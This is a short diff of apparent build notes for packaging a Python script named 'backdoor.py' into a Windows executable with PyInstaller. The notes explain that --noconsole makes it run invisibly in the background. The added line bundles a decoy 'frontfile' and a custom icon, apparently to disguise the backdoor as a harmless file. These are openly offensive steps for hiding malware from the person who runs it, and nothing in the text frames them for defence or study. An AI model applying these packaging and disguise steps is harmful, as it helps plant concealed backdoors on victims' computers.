@@ -16,7 +16,7 @@ c:\python27\scripts\pyinstaller.exe backdoor.py --onefile
 #pack all lib and support file in --onefile
 #it will create a binary executable of backdoor it will execute when double click with a visible backgroung execution
 
-c:\python27\scripts\pyinstaller.exe backdoor.py --onefile --noconsole
+c:\python27\scripts\pyinstaller.exe backdoor.py --onefile --noconsole --add-data path/to/frontfile --icon path/to/icon.ico
 
 #to run invisible in background
 
